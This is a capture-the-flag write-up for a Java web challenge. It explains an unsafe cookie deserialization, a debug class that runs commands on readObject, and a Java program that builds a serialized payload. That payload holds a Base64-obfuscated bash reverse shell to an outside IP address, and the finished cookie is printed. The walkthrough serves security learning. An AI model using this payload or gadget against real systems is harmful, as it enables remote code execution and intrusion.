---
source: kevin-mizu
source_url: https://mizu.re/post/missions_forum
title: "Mission Forum | mizu.re"
description: "Mission Forum"
---

_keyboard\_arrow\_up_

title: Mission Forum

date: Dec 25, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [YogoshaChristmas\_2022](https://mizu.re/tag/YogoshaChristmas_2022) [Web](https://mizu.re/tag/Web)

# Missions Forum

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/missions_forum/images/yogosha.svg)

* * *

Difficulty: 500 points \| 19 solves

Description: In kara Organization we have a website where we save our next missions in a secure way. Now After all what you have done, it's time to save the mission before going to Konoha!

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/missions_forum#%EF%B8%8F-recon)
- [💥 Java deserialization](https://mizu.re/post/missions_forum#-java-deserialization)
- [🎉 Flag](https://mizu.re/post/missions_forum#-flag)

## 🕵️ Recon

This challenge was the 6th step of the CTF. For this challenge, we had to find a way to get an RCE on the challenge.

![home.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/missions_forum/images/home.png)

_Home page_

The website hasn't that much features:

- Create mission post
- List mission post

But from a normal user, nothing is working.

![error.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/missions_forum/images/error.png)

If we take a look to the HTML commentary of the home page, we could find:

```html
<!-- Check /backup/MissionController.java -->
```

Going to /backup/ and we get access to the source code of 2 files:

![backup.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/missions_forum/images/backup.png)

- `MissionController.java`

```java
package com.yogosha.controllers;

import com.yogosha.entities.Mission;
import com.yogosha.services.MissionService;
import com.yogosha.services.Security;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@Controller
public class MissionController
{
  private MissionService missionService;

  @Autowired
  public void setMissionService(MissionService missionService) {
    this.missionService = missionService;
  }

  @RequestMapping(value = {"/latest_mission"}, method = {RequestMethod.GET})
  public String list(@CookieValue(value = "latest_mission", defaultValue = "") String latest_mission, Model model) {
     if (latest_mission.length() == 0) {
       model.addAttribute("latest_mission", "No recent mission detected");
    } else {
      try {
        byte[] decodedBytes = Base64.getDecoder().decode(latest_mission);
        ByteArrayInputStream ini = new ByteArrayInputStream(decodedBytes);
        Security inp = new Security(ini);
        Mission result = null;
        result = (Mission)inp.readObject();
        model.addAttribute("latest_mission", result.getMission());
      }
       catch (IllegalArgumentException ex) {
        model.addAttribute("latest_mission", "An Error has occured");
        ex.printStackTrace();
       } catch (IOException e) {
        model.addAttribute("latest_mission", "An Error has occured");
        e.printStackTrace();
       } catch (ClassNotFoundException e) {
        model.addAttribute("latest_mission", "An Error has occured");
        e.printStackTrace();
      }
    }
    return "missions";
  }

  @RequestMapping({"/mission/new"})
  public String newMission(Model model) {
    return "missionform";
  }

  @RequestMapping(value = {"/mission"}, method = {RequestMethod.POST})
  public String saveMission(HttpServletResponse response, HttpServletRequest req) {
    Mission mission = new Mission(req.getParameter("mission"), req.getParameter("category"), req.getParameter("anime"));
    this.missionService.saveMission(mission);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    try {
       ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
       objectOutputStream.writeObject(mission);
       objectOutputStream.close();
       String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
       Cookie latest_mission = new Cookie("latest_mission", cookie);
       response.addCookie(latest_mission);
    } catch (IOException e) {
       Cookie latest_mission = new Cookie("latest_mission", "");
       e.printStackTrace();
       response.addCookie(latest_mission);
    }
    return "redirect:/latest_mission";
  }
}
```

- `MissionDebug.java`

```java
package com.yogosha.utils;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class MissionDebug implements Serializable {
        private static final long serialVersionUID = 298788778888997655L;
        private String debug;
        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException  {
    try{
        ois.defaultReadObject();
        Runtime runtime = Runtime.getRuntime();
        runtime.exec((String) this.debug);
    } catch (IOException e) {
        e.printStackTrace();
    }

    }
}
```

## 💥 Java deserialization

In those files, there is something interesting:

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException  {
    try{
        ois.defaultReadObject();
        Runtime runtime = Runtime.getRuntime();
        runtime.exec((String) this.debug);
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

In fact, in java, the `readObject` method is used by the class when unserialize an object. As you can see, in the `MissionDebug` class, the `debug` attribute is directly passed over the `runtime.exec` function which could lead to RCE. More details about java deserialization here: [link](https://snyk.io/blog/serialization-and-deserialization-in-java/).

Thus, we have to find an input where we control the object which is unserialize. This is possible in the `/latest_mission` route.

```java
public String list(@CookieValue(value = "latest_mission", defaultValue = "")
...
byte[] decodedBytes = Base64.getDecoder().decode(latest_mission);
ByteArrayInputStream ini = new ByteArrayInputStream(decodedBytes);
Security inp = new Security(ini);
Mission result = null;
result = (Mission)inp.readObject();
model.addAttribute("latest_mission", result.getMission());
```

In the above snippet, the value of `latest_mission` is:

1. Base64 decoded
2. Loaded has ByteArray
3. Some security checks are made (no source code for this part)
4. the readObject() function is called

An important point on the following line is that even if the `inp` object is cast to `Mission`, the `readObject` function will be called first.

```java
result = (Mission)inp.readObject();
```

Thus, if we:

1. Serialize as ByteArray a `MissionDebug` object with the command to execute inside `debug`
2. Base64 the output
3. Set the value in `latest_mission` cookie
4. Go to `/latest_mission`

Then, we would be able to exec command on the server 🔥

If we sum up the serialize part inside a java script we get:

```java
import com.yogosha.utils.MissionDebug;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.util.Base64;

class Main {
  public static void main(String[] args) {
    // Create new object
    MissionDebug debug = new MissionDebug("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4zNi4xMDMuMTM4LzkwMDAgMD4mMQ==}|{base64,-d}|{bash,-i}");
    String cookie = null;

    // Serialize object
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream out = null;
    try {
      out = new ObjectOutputStream(bos);
      out.writeObject(debug);
      out.close();
      cookie = Base64.getEncoder().encodeToString(bos.toByteArray());
      System.out.println(cookie);
    } catch (IOException e) {
      System.out.println(e);
    }
  }
}
```

## 🎉 Flag

Running the above script, we get the following value:

```
rO0ABXNyAB5jb20ueW9nb3NoYS51dGlscy5NaXNzaW9uRGVidWcEJYLPtI0rFwIAAUwABWRlYnVndAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDODFOQzR6Tmk0eE1ETXVNVE00THprd01EQWdNRDRtTVE9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9
```

Using it on `/latest_mission` we get:

![shell.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/missions_forum/images/shell.png)

Flag: `FLAG{J4vA_Des3rialization_1s_Th3_B3sT_U_kNoW?}` 🎉

[_keyboard\_arrow\_left_ Last Battle](https://mizu.re/post/last_battle)

[Kara Jutsu Platform _keyboard\_arrow\_right_](https://mizu.re/post/kara_jutsus_platform)